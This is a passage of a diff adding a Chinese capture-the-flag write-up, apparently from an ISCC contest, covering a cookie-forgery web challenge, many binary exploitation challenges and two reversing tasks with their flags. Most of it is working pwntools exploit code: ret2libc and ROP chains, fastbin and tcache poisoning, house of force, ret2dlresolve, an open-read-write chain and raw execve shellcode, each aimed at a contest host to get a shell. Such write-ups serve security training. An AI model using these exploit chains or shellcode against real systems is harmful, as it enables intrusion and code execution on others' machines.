+fake_c0 = strxor(c_1,target1)
+
+new_c = fake_c0 + c[16:]
+base_new_c = base64.b64encode(new_c)
+
+# url = &amp;quot;http://47.94.14.162:10014/normal.php&amp;quot;
+# cookie = &amp;#123;&amp;quot;Auth_Key&amp;quot;:urllib.parse.quote(&amp;quot;WQ1eYrDvXCKueNoi7QHdPA==&amp;quot;),&amp;quot;Cyber_info&amp;quot;:urllib.parse.quote(base_new_c),&amp;quot;PHPSESSID&amp;quot;:&amp;quot;acak5gn1r8pc670ve0lrel2u8u&amp;quot;&amp;#125;
+# print(requests.get(url,cookies=cookie).text)
+
+cc = &amp;#39;LwrtjHvppj+1L9wrF8Fz43RtIjtzOjU6InRlY2huIjtzOjg6InVzZXJuYW1lIjtzOjM6Im00eCI7czo4OiJwYXNzd29yZCI7czo2OiIxMjM0NTYiO30=&amp;#39;
+cc0 = base64.b64decode(cc)[:16]
+m0 = b&amp;#39;a:3:&amp;#123;s:8:&amp;quot;deppar&amp;#39;
+cc_1 = strxor(real_iv,cc0)
+fake_iv = strxor(cc_1,m0)
+
+print(base64.b64encode(fake_iv))
+
+url = &amp;quot;http://47.94.14.162:10014/normal.php&amp;quot;
+cookie = &amp;#123;&amp;quot;Auth_Key&amp;quot;:urllib.parse.quote(&amp;quot;Fz2A1LB1wCUhdWJsirDPrQ==&amp;quot;),&amp;quot;Cyber_info&amp;quot;:urllib.parse.quote(base_new_c),&amp;quot;PHPSESSID&amp;quot;:&amp;quot;t4dod0sk4coouvcc4d0qa4f7nj&amp;quot;&amp;#125;
+print(cookie)
+print(requests.get(url,cookies=cookie).text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现silly是弱密码，登silly&lt;/p&gt;
+&lt;p&gt;运行上面那个脚本，对cookie进行替换&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106391.png&#34; alt=&#34;image-20230524210434917&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106639.png&#34; alt=&#34;image-20230524210445482&#34;&gt;&lt;/p&gt;
+&lt;p&gt;刷新即可成功混进去&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106399.png&#34; alt=&#34;image-20230524210500029&#34;&gt;&lt;/p&gt;
+&lt;p&gt;现在我们进入技术部门了，直接任命我自己，连胜两级&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106985.png&#34; alt=&#34;image-20230524210521269&#34;&gt;&lt;/p&gt;
+&lt;p&gt;一直升升到100多，然后再换一个号，用enj给这个号升级，升完以后再换过来，直到升到10w&lt;/p&gt;
+&lt;p&gt;成功读取flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242106441.png&#34; alt=&#34;image-20230524210533166&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;PWN&#34;&gt;&lt;a href=&#34;#PWN&#34; class=&#34;headerlink&#34; title=&#34;PWN&#34;&gt;&lt;/a&gt;PWN&lt;/h2&gt;&lt;h3 id=&#34;三个愿望&#34;&gt;&lt;a href=&#34;#三个愿望&#34; class=&#34;headerlink&#34; title=&#34;三个愿望&#34;&gt;&lt;/a&gt;三个愿望&lt;/h3&gt;&lt;p&gt;存在溢出和后门，格式化字符串泄露canary，控制种子，预测随机数&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import *
+from ctypes import *
+context.log_level=&amp;#39;debug&amp;#39;
+p,e,libc=load(&amp;#39;a&amp;#39;,&amp;#39;59.110.164.72:10001&amp;#39;)
+e = cdll.LoadLibrary(&amp;#39;libc.so.6&amp;#39;)
+system=0x4011F5
+payload=b&amp;#39;\x00&amp;#39;*0x16 
+e.srand(0)
+p.sendafter(&amp;#39;Now you can make your first wish&amp;#39;,payload)
+p.recvuntil(&amp;#39;Please give me a number!&amp;#39;)
+payload=str(e.rand() % 9 + 1)
+p.sendline(payload)
+payload=b&amp;#39;%11$p&amp;#39;
+p.sendafter(&amp;#39;Now you can make your second wish!&amp;#39;,payload)
+a=p.recv(1)
+canary=int(p.recv(18),16)
+p.recvuntil(&amp;#39;Please give me a number!&amp;#39;)
+payload=str(2)
+p.sendline(payload)
+payload=b&amp;#39;a&amp;#39;*0x28+p64(canary)+p64(system)*2
+p.sendafter(&amp;#39;Now you can make your final wish!&amp;#39;,payload)
+p.interactive()  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;Login&#34;&gt;&lt;a href=&#34;#Login&#34; class=&#34;headerlink&#34; title=&#34;Login&#34;&gt;&lt;/a&gt;Login&lt;/h3&gt;&lt;p&gt;有溢出，有libc地址，直接打ret2libc&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import *
+context.log_level=&amp;#39;debug&amp;#39;
+p,e,libc=load(&amp;#39;Login&amp;#39;,&amp;#39;59.110.164.72:10000&amp;#39;)
+p.recvuntil(&amp;#39;Here is a tip: &amp;#39;)
+libc_base=int(p.recv(14),16)-0x3c48e0
+system=libc_base+0x453a0
+bin=libc_base+0x18ce57
+pop_rdi=0x00000000004008c3
+payload=b&amp;#39;a&amp;#39;*28+p32(0x15CC15CC)
+p.sendafter(&amp;#39;input the username:&amp;#39;,payload)
+payload=b&amp;#39;a&amp;#39;*0x28+p64(pop_rdi)+p64(bin)+p64(system)
+p.sendafter(&amp;#39;input the password:&amp;#39;,payload)
+p.interactive()  
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;Double&#34;&gt;&lt;a href=&#34;#Double&#34; class=&#34;headerlink&#34; title=&#34;Double&#34;&gt;&lt;/a&gt;Double&lt;/h3&gt;&lt;p&gt;刚开始以为是个菜单堆，不过发现程序给了后门，于是思路就是用fastbin attack让满足if的条件，通过检查后，因为存在栈溢出，打栈迁移执行system(“&amp;#x2F;bin&amp;#x2F;sh”)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import*
+p,e,libc=load(&amp;#39;double&amp;#39;,&amp;#39;59.110.164.72:10021&amp;#39;)
+def add(index,size):
+    p.sendlineafter(&amp;#39;请选择：&amp;#39;,str(1))
+    p.sendlineafter(&amp;#39;请输入序号：&amp;#39;,str(index))
+    p.sendlineafter(&amp;#39;请输入大小&amp;#39;,str(size))
+def delete(index):
+    p.sendlineafter(&amp;#39;请选择：&amp;#39;,str(2))
+    p.sendlineafter(&amp;#39;请输入序号：&amp;#39;,str(index))
+def show(index):
+    p.sendlineafter(&amp;#39;请选择：&amp;#39;,str(3))
+    p.sendlineafter(&amp;#39;请输入序号：&amp;#39;,str(index))
+def edit(index,content):
+    p.sendlineafter(&amp;#39;请选择：&amp;#39;,str(4))
+    p.sendlineafter(&amp;#39;请输入序号：&amp;#39;,str(index))
+    p.sendlineafter(&amp;#39;请输入编辑内容：&amp;#39;,content)
+add(0,0x400)
+add(1,0x68)
+delete(0)
+
+add(2,0x400)
+show(2)
+libc_base=recv_libc()
+
+malloc_hook=libc_base-0x10-88
+log_addr(&amp;#39;malloc_hook&amp;#39;)
+libc_base=libc_base-0x3c4b78
+log_addr(&amp;#39;libc_base&amp;#39;)
+add(3,0x68)
+delete(3)
+add(4,0x68)
+delete(3)
+edit(4,p64(0x6021E0-8))
+add(5,0x68)
+add(6,0x68)
+edit(6,p64(0x15CC15CC)+b&amp;#39;a&amp;#39;*0x38+p64(0xCC51CC51))
+p.sendlineafter(&amp;#39;请选择：&amp;#39;,str(5))
+p.recvuntil(&amp;#39;congratulations! Give you a reward:&amp;#39;)
+stack=int(p.recv(15),16)
+payload=p64(0x0000000000400cb3)+p64(0x400CD8)+p64(0x4008FE)+b&amp;#39;a&amp;#39;*8+p64(stack-8)
+p.recvuntil(&amp;#39;please input what you want to say:&amp;#39;)
+p.sendline(payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;困局&#34;&gt;&lt;a href=&#34;#困局&#34; class=&#34;headerlink&#34; title=&#34;困局&#34;&gt;&lt;/a&gt;困局&lt;/h3&gt;&lt;p&gt;格式化字符串泄露canary，libc，栈地址。最后打orw绕过沙箱。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import*
+context.log_level=&amp;#39;debug&amp;#39;
+p,e,libc=load(&amp;#39;Trapped&amp;#39;,&amp;#39;59.110.164.72:10066&amp;#39;)
+p.sendlineafter(&amp;#39;This is a larger box\n&amp;#39;,b&amp;#39;%9$p%15$p%p&amp;#39;)
+p.sendlineafter(&amp;#39;We have a lot to talk about\n&amp;#39;,b&amp;#39;a&amp;#39;*0x10)
+canary=int(p.recv(18),16)
+log_addr(&amp;#39;canary&amp;#39;)
+libc_base=int(p.recv(14),16)-0x20840
+log_addr(&amp;#39;libc_base&amp;#39;)
+stack=int(p.recv(14),16)
+log_addr(&amp;#39;stack&amp;#39;)
+pop_rdi=libc_base+0x0000000000021112
+pop_rsi=libc_base+0x00000000000202f8
+pop_rdx=libc_base+0x0000000000001b92
+read=libc_base+0xf7350
+write=libc_base+0xf73b0
+open=libc_base+0xf7130
+debug(p,0x400804)
+orw=p64(pop_rdi)+p64(stack+0xd0)+p64(pop_rsi)+p64(0)+p64(open)
+orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stack-0x50)+p64(pop_rdx)+p64(0x50)+p64(read)
+orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stack-0x50)+p64(pop_rdx)+p64(0x50)+p64(write)+b&amp;#39;flag\x00\x00\x00\x00&amp;#39;
+
+p.sendlineafter(&amp;#39;This is a larger box\n&amp;#39;,b&amp;#39;%9$p%15$p&amp;#39;)
+p.sendlineafter(&amp;#39;We have a lot to talk about\n&amp;#39;,b&amp;#39;a&amp;#39;*0x28+p64(canary)+p64(0xdeadbeef)+orw)
+p.interactive() 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;chef&#34;&gt;&lt;a href=&#34;#chef&#34; class=&#34;headerlink&#34; title=&#34;chef&#34;&gt;&lt;/a&gt;chef&lt;/h3&gt;&lt;p&gt;简单题，存在堆溢出，直接打fastbin attack然后申请控制堆块，风水一下绕过size的检查，改指针为got表，用show函数泄露出libc地址，向free_hook写入one_gadget&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import*
+context.log_level=&amp;#39;debug&amp;#39;
+p,e,libc=load(&amp;#39;chef&amp;#39;,&amp;#39;59.110.164.72:10031&amp;#39;)
+p.sendlineafter(&amp;#39;Your choice:&amp;#39;,str(4))
+def show():
+    p.sendlineafter(&amp;#39;Your choice:&amp;#39;,str(1))
+def add(size,content):
+    p.sendlineafter(&amp;#39;Your choice:&amp;#39;,str(2))
+    p.sendlineafter(&amp;#39;Please enter the price of food:&amp;#39;,str(size))
+    p.sendafter(&amp;#39;Please enter the name of food:&amp;#39;,content)
+def edit(index,size,content):
+    p.sendlineafter(&amp;#39;Your choice:&amp;#39;,str(3))
+    p.sendlineafter(&amp;#39;Please enter the index of food&amp;#39;,str(index))
+    p.sendlineafter(&amp;#39;Please enter the price of food :&amp;#39;,str(size))
+    p.sendlineafter(&amp;#39;Please enter the name of food&amp;#39;,content)
+def delete(index):
+    p.sendlineafter(&amp;#39;Your choice:&amp;#39;,str(4))
+    p.sendlineafter(&amp;#39;Please enter the index of food:&amp;#39;,str(index))
+add(0x68,b&amp;#39;trunk&amp;#39;) #0
+add(0x58,&amp;#39;a&amp;#39;)  #1
+add(0x58,&amp;#39;a&amp;#39;)  #2
+add(0x58,&amp;#39;a&amp;#39;)  #3
+delete(2)
+delete(1)
+edit(0,0x78,b&amp;#39;a&amp;#39;*0x68+p64(0x61)+p64(0x6020a0-8))
+add(0x58,&amp;#39;a&amp;#39;) #4
+add(0x58,p64(0x602018)) #5
+show()
+one=[0x45226,0x4527a,0xf03a4,0xf1247]
+libc_base=recv_libc()-0x84540
+log_addr(&amp;#39;libc_base&amp;#39;)
+malloc_hook=libc_base+0x3c4b10
+free_hook=libc_base+0x3c67a8
+debug(p,add_p,delete_p,show_p,edit_p)
+edit(2,0x78,p64(free_hook))
+edit(0,0x78,p64(one[1]+libc_base))
+delete(3)
+p.interactive() 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;谜语人&#34;&gt;&lt;a href=&#34;#谜语人&#34; class=&#34;headerlink&#34; title=&#34;谜语人&#34;&gt;&lt;/a&gt;谜语人&lt;/h3&gt;&lt;p&gt;libc给的不对，需要泄露出地址用libcsearcher来搜。&lt;/p&gt;
+&lt;p&gt;逆向分析后发现是菜单堆，只能申请0x30的堆块，存在一个UAF漏洞，因为缓冲区没有设置好，可以直接打tcache bin attack劫持到缓冲区的堆块上，然后申请出来再释放即可泄露出来libc地址。用Libcsearcher搜一下，然后打tcache bin attack劫持free_hook&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import *
+context.log_level=&amp;#39;debug&amp;#39;
+
+p,e,libc=load(&amp;quot;Riddler.bk&amp;quot;,&amp;quot;59.110.164.72:10086&amp;quot;)
+
+def add(index):
+    p.sendlineafter(&amp;quot;Then?\n&amp;quot;,str(2))
+    p.sendlineafter(&amp;quot;emmm?!\n&amp;quot;,str(index))
+
+def edit(index,content):
+    p.sendlineafter(&amp;quot;Then?\n&amp;quot;,str(3))
+    p.sendlineafter(&amp;quot;emmm?!\n&amp;quot;,str(index))
+    #pause()
+    p.sendline(content)
+
+
+def show(index):
+    p.sendlineafter(&amp;quot;Then?\n&amp;quot;,str(0))
+    p.sendlineafter(&amp;quot;emmm?!\n&amp;quot;,str(index))
+
+
+def delete(index):
+    p.sendlineafter(&amp;quot;Then?\n&amp;quot;,str(1))
+    p.sendlineafter(&amp;quot;emmm?!\n&amp;quot;,str(index))
+add(4)
+add(5)
+add(6)
+delete(5)
+delete(6)
+show(6)
+heap_addr=u32(p.recv(4))
+log_addr(&amp;#39;heap_addr&amp;#39;)
+edit(6,p32(heap_addr-0x1040))
+add(7)
+add(8)
+delete(8)
+show(8)
+p.recv(4)
+leak_libc=u32(p.recv(4))-56-0x18#-0x1d87d8
+# obj = LibcSearcher(&amp;#39;__malloc_hook&amp;#39;, leak_libc)
+libc_base = leak_libc - 0x1d5788#obj.dump(&amp;#39;__malloc_hook&amp;#39;)
+sys_addr = libc_base + 0x03cf10#obj.dump(&amp;#39;system&amp;#39;)
+free_hook=libc_base+0x001d68d0#obj.dump(&amp;#39;__free_hook&amp;#39;)
+log_addr(&amp;#39;libc_base&amp;#39;)
+delete(7)
+delete(4)
+edit(4,p32(free_hook))
+add(9)
+edit(9,&amp;#39;/bin/sh\x00&amp;#39;)
+add(0x3)
+edit(0x3,p32(sys_addr))
+delete(0x9)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;eat-num&#34;&gt;&lt;a href=&#34;#eat-num&#34; class=&#34;headerlink&#34; title=&#34;eat_num&#34;&gt;&lt;/a&gt;eat_num&lt;/h3&gt;&lt;p&gt;原题，打ret2dl即可。因为是原题直接用模板打就行&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import*
+p,e,libc=load(&amp;#39;38&amp;#39;,&amp;#39;59.110.164.72:10067&amp;#39;)
+offset=0x4c
+plt0 = e.get_section_by_name(&amp;#39;.plt&amp;#39;).header.sh_addr
+rel_plt = e.get_section_by_name(&amp;#39;.rel.plt&amp;#39;).header.sh_addr
+dynsym = e.get_section_by_name(&amp;#39;.dynsym&amp;#39;).header.sh_addr
+dynstr = e.get_section_by_name(&amp;#39;.dynstr&amp;#39;).header.sh_addr
+read_plt_addr=e.plt[&amp;#39;read&amp;#39;]
+four_pop_ret=0x80484A8  #***
+leave_ret_addr=0x8048428  #***
+base_addr=0x0804a800
+fake_sym_addr=base_addr+32
+align=0x10-((fake_sym_addr-dynsym)&amp;amp;0xf)
+fake_sym_addr+=align
+st_name=fake_sym_addr+0x10-dynstr
+st_info=12
+fake_sym=p32(st_name)+p32(0)+p32(0)+p32(st_info)
+r_offset=e.got[&amp;#39;read&amp;#39;]
+r_sym=(fake_sym_addr-dynsym)/0x10
+r_type=0x7
+r_info=(int(r_sym)&amp;lt;&amp;lt;8)+(r_type&amp;amp;0xf)
+reloc_index=base_addr-rel_plt+24
+fake_rel_plt=p32(r_offset)+p32(r_info)
+payload1=offset*b&amp;#39;a&amp;#39;+p32(read_plt_addr)+p32(four_pop_ret)+p32(0)+p32(base_addr)+p32(100)+p32(base_addr-4)+p32(leave_ret_addr)
+p.send(payload1)
+pause()
+payload2=p32(plt0)+p32(reloc_index)
+payload2+=b&amp;#39;bbbb&amp;#39;
+payload2+=p32(base_addr+80)
+payload2+=b&amp;#39;bbbb&amp;#39;
+payload2+=b&amp;#39;bbbb&amp;#39;
+payload2+=fake_rel_plt
+payload2+=align*b&amp;#39;a&amp;#39;
+payload2+=fake_sym
+payload2+=b&amp;#39;system\x00&amp;#39;
+payload2+=(80-len(payload2))*b&amp;#39;a&amp;#39;
+payload2+=b&amp;#39;/bin/sh\x00&amp;#39;
+payload2+=(100-len(payload2))*b&amp;#39;a&amp;#39;
+p.send(payload2)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;第二识势&#34;&gt;&lt;a href=&#34;#第二识势&#34; class=&#34;headerlink&#34; title=&#34;第二识势&#34;&gt;&lt;/a&gt;第二识势&lt;/h3&gt;&lt;p&gt;先打house of force，把data段的内存给申请出来，向里面写入0x10个字符a来绕过if的检查。因为啥保护都没开，直接打ret2shellcode即可，如果不打house of force的话，默认的检查是过不去的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import *
+p,elf,libc=load(&amp;quot;last&amp;quot;,&amp;quot;59.110.164.72:10025&amp;quot;)
+p.sendafter(&amp;quot;Start injecting\n&amp;quot;,b&amp;quot;\x00&amp;quot;+b&amp;quot;y&amp;quot;*23)
+p.recvline()
+heap_addr=int(p.recv(9)[:-1])
+log_addr(&amp;quot;heap_addr&amp;quot;)
+pause()      
+p.send(str(-1)) 
+pause()
+request_size=0x6012a0-0x20-(heap_addr-8)
+p.send(str(request_size))
+payload=b&amp;quot;a&amp;quot;*0x10
+p.sendafter(b&amp;quot;Answer time is close to over\n&amp;quot;,payload)
+leave_ret=0x0000000000400944
+rbp=0x00000601328
+shellcode=0x601338
+payload=b&amp;quot;a&amp;quot;*0x80
+payload+=p64(rbp)+p64(leave_ret)+p64(shellcode)
+payload+=b&amp;quot;\x48\xC7\xC0\x3B\x00\x00\x00\x49\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x41\x50\x48\x31\xF6\x48\x31\xD2\x54\x5F\x0F\x05&amp;quot;
+p.sendafter(&amp;quot;Direct to destination\n&amp;quot;,payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;第一用笔&#34;&gt;&lt;a href=&#34;#第一用笔&#34; class=&#34;headerlink&#34; title=&#34;第一用笔&#34;&gt;&lt;/a&gt;第一用笔&lt;/h3&gt;&lt;p&gt;存在溢出，控制rbp第二次调用read任意写，打one_gadget拿shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import *
+context.log_level=&amp;quot;debug&amp;quot;
+p=remote(&amp;quot;59.110.164.72&amp;quot;,10002)
+pop_rdi=0x0000000000400c53
+puts_plt=0x4006F0
+puts_got=0x602020
+payload=b&amp;#39;dunbi000&amp;#39;
+payload+=b&amp;#39;cuobi000&amp;#39;
+payload+=b&amp;#39;yufeng00&amp;#39;
+payload+=b&amp;#39;dunfeng0&amp;#39;
+payload+=b&amp;#39;cunfeng0&amp;#39;
+payload+=b&amp;#39;nvfeng00&amp;#39;
+payload+=b&amp;#39;yuefeng0&amp;#39;
+payload+=b&amp;#39;anfeng00&amp;#39;
+payload+=b&amp;#39;jiebi000&amp;#39;
+p.sendlineafter(&amp;quot;and 40 to 47 is &amp;#39;nvfeng00&amp;#39;!\n&amp;quot;,payload)
+debug(p)
+payload=b&amp;#39;a&amp;#39;*0x28+p64(0x400B0F)
+p.sendafter(&amp;quot;or you can look for other space\n&amp;quot;,payload)
+payload=b&amp;#39;a&amp;#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x400B0F)
+pause()
+p.send(payload)
+libc_base=u64(p.recvuntil(b&amp;#39;\x7f&amp;#39;)[-6:].ljust(8,b&amp;#39;\x00&amp;#39;))-0x6f6a0
+log_addr(&amp;quot;libc_base&amp;quot;)
+og=[0x45226,0x4527a,0xf03a4,0xf1247]
+payload=b&amp;#39;a&amp;#39;*0x28+p64(og[1]+libc_base)
+pause()
+p.send(payload)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;SIMS&#34;&gt;&lt;a href=&#34;#SIMS&#34; class=&#34;headerlink&#34; title=&#34;SIMS&#34;&gt;&lt;/a&gt;SIMS&lt;/h3&gt;&lt;p&gt;2.27因为有uaf和edit功能，直接打tcache poisoning&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import *
+context.log_level=&amp;#39;debug&amp;#39;
+
+def add(size):
+    p.sendlineafter(&amp;quot;please choose one!\n&amp;quot;,str(1))
+    p.sendlineafter(&amp;quot;Age of Stu:\n&amp;quot;,str(size))
+    
+def show(index):
+    p.sendlineafter(&amp;quot;please choose one!\n&amp;quot;,str(4))
+    p.sendlineafter(&amp;quot;Index:\n&amp;quot;,str(index))
+
+def edit(index,content):
+    p.sendlineafter(&amp;quot;please choose one!\n&amp;quot;,str(3))
+    p.sendlineafter(&amp;quot;Index:\n&amp;quot;,str(index))
+    p.sendafter(&amp;quot;Content of Stu:\n&amp;quot;,content)
+
+def delete(index):
+    p.sendlineafter(&amp;quot;please choose one!\n&amp;quot;,str(2))
+    p.sendlineafter(&amp;quot;Index:\n&amp;quot;,str(index))
+p,e,libc=load(&amp;quot;SIMS&amp;quot;,&amp;quot;59.110.164.72:10085&amp;quot;)
+key=1804289383^365696460
+p.sendlineafter(&amp;quot;welcome~ please input the password:\n&amp;quot;,str(key))
+add(0x500)
+add(0x40)
+add(0x40)
+delete(0)
+delete(1)
+delete(2)
+show(0)
+libc_base=recv_libc()-0x3ebca0
+sys_addr=libc_base+libc.symbols[&amp;#39;system&amp;#39;]
+free_hook=libc_base+libc.symbols[&amp;#39;__free_hook&amp;#39;]
+edit(2,p64(free_hook))
+add(0x40)
+add(0x40)
+edit(2,&amp;#39;/bin/sh\x00&amp;#39;)
+edit(1,p64(sys_addr))
+delete(2)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;Your-character&#34;&gt;&lt;a href=&#34;#Your-character&#34; class=&#34;headerlink&#34; title=&#34;Your_character&#34;&gt;&lt;/a&gt;Your_character&lt;/h3&gt;&lt;p&gt;2.23的libc，发现是个菜单堆，漏洞是off by one，释放堆块进入unsorted bin，执行show函数可以得到unsorted bin的fd指针，也就是main_arena+88，也就是libc地址。然后再改size中的prev inuse位，触发堆块合并，造成堆块重叠，然后把free_hook申请出来写入one_gadget&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;py&#34;&gt;from tools import*
+p,e,libc=load(&amp;#39;4&amp;#39;,&amp;#39;59.110.164.72:10003&amp;#39;)
+p.sendlineafter(&amp;#39;Your choice :&amp;#39;,str(1))
+def add(size,content=&amp;#39;/bin/sh\x00&amp;#39;):
+    p.sendlineafter(&amp;#39;Your choice :&amp;#39;,str(1))
+    p.sendlineafter(&amp;#39;Damage of skill :&amp;#39;,str(size))
+    p.sendafter(&amp;#39;introduction of skill:&amp;#39;,content)
+def edit(index,size):
+    p.sendlineafter(&amp;#39;Your choice :&amp;#39;,str(2))
+    p.sendlineafter( &amp;#39;Index :&amp;#39;,str(index))
+    p.sendafter(&amp;#39;Damage of skill :&amp;#39;,str(size))
+def edit2(index,content=&amp;#39;/bin/sh\x00&amp;#39;):
+    p.sendlineafter(&amp;#39;Your choice :&amp;#39;,str(3))
+    p.sendlineafter( &amp;#39;Index :&amp;#39;,str(index))
+    p.sendafter(&amp;#39;introduction of skill :&amp;#39;,content)
+def show(index):
+    p.sendlineafter(&amp;#39;Your choice :&amp;#39;,str(4))
+    p.sendlineafter( &amp;#39;Index :&amp;#39;,str(index))
+def delete(index):
+    p.sendlineafter(&amp;#39;Your choice :&amp;#39;,str(5))
+    p.sendlineafter( &amp;#39;Index :&amp;#39;,str(index))
+
+add(0x478,b&amp;#39;1&amp;#39;*0x28)
+add(0x28,b&amp;#39;2&amp;#39;*0x28)
+edit(0,0x488)
+add(0x28,b&amp;#39;aaaaaaaa&amp;#39;)
+show(2)
+p.recvuntil(&amp;#39;aaaaaaaa&amp;#39;)
+libc_base=u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))-0x3c4b78
+log_addr(&amp;#39;libc_base&amp;#39;)
+malloc_hook=libc_base+0x3c4b10
+free=libc_base+0x3c67a8
+og=[0x45226,0x4527a,0xf03a4,0xf1247]
+edit2(0,b&amp;#39;a&amp;#39;*0x430+p64(0x440))
+delete(1)
+delete(0)
+delete(2)
+add(0x38)
+edit(0,0x38)
+add(0x38)
+edit(1,0x38)
+add(0x38)
+edit(2,0x38)
+add(0x38,&amp;#39;cccccccc&amp;#39;)
+edit(3,0x48)
+edit2(0,b&amp;#39;b&amp;#39;*0x38+b&amp;#39;\x61&amp;#39;)
+delete(1)
+add(0x58,b&amp;#39;dddddddd&amp;#39;*7+p64(0x50)*2+p64(free))
+edit(1,0x58)
+edit2(2,p64(og[1]+libc_base))
+delete(0)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;Reverse&#34;&gt;&lt;a href=&#34;#Reverse&#34; class=&#34;headerlink&#34; title=&#34;Reverse&#34;&gt;&lt;/a&gt;Reverse&lt;/h2&gt;&lt;h3 id=&#34;JustDoIt&#34;&gt;&lt;a href=&#34;#JustDoIt&#34; class=&#34;headerlink&#34; title=&#34;JustDoIt&#34;&gt;&lt;/a&gt;JustDoIt&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242208224.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;只有一个加密函数，在第36行的sub_487C91&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242208223.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;简单的加密函数，是一些常规的字符串变换，有四个for循环加密&lt;/p&gt;
+&lt;p&gt;只有最后一个for循环需要注意，使用了“ISCC”来加密&lt;/p&gt;
+&lt;p&gt;脚本&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
+int main() &amp;#123;
+    char a1[15]=&amp;#123;23,68,68,15,94,10,8,10,6,95,8,24,87,3,26&amp;#125;;
+      char a2[5]=&amp;quot;ISCC&amp;quot;;
+    int a3 = 15;
+
+    for (int m = 1; m &amp;lt; a3; ++m) &amp;#123;
+        a1[m] ^= a2[0];
+        a1[m] -= a2[m % 4] % 5;
+        a1[m] += a2[2] % 6 + a2[3] / 6;
+        a1[m] -= a2[1] / 7 + a2[0] % 7;
+    &amp;#125;
+    for (int k = 1; k &amp;lt; a3; ++k) &amp;#123;
+        a1[k] -= k;
+    &amp;#125;
+    int v4 = a1[a3 - 1];
+    for (int j = a3 - 1; j &amp;gt; 0; --j) &amp;#123;
+        a1[j] = a1[j - 1];
+    &amp;#125;
+    for (int i = 0; i &amp;lt; a3; ++i) &amp;#123;
+        a1[i] += 60;
+    &amp;#125;
+    for (int i = 1; i &amp;lt;15; ++i) &amp;#123;
+        if(i==15)
+        &amp;#123;
+            printf(&amp;quot;%c&amp;quot;,a1[0]);
+        return 0;
+        &amp;#125;
+        printf(&amp;quot;%c&amp;quot;, a1[i]); 
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到flag：ISCC{Just&lt;del&gt;Do&lt;/del&gt;It} &lt;/p&gt;
+&lt;h3 id=&#34;奇门遁甲&#34;&gt;&lt;a href=&#34;#奇门遁甲&#34; class=&#34;headerlink&#34; title=&#34;奇门遁甲&#34;&gt;&lt;/a&gt;奇门遁甲&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305242220688.gif&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;逻辑是需要按照v3自增的顺序选择输入，v3是从1加到8，我们需要让case选择v3自增的顺序，也就是3 1 2 8 4 5 6 7&lt;/p&gt;
+&lt;p&gt;每次输入都会有flag碎片，拼起来就能得到flag&lt;/p&gt;
+&lt;p&gt;Flag：ISCC{xx9nGK&amp;amp;2tQrDV6WcoxSGRGAX} &lt;/p&gt;
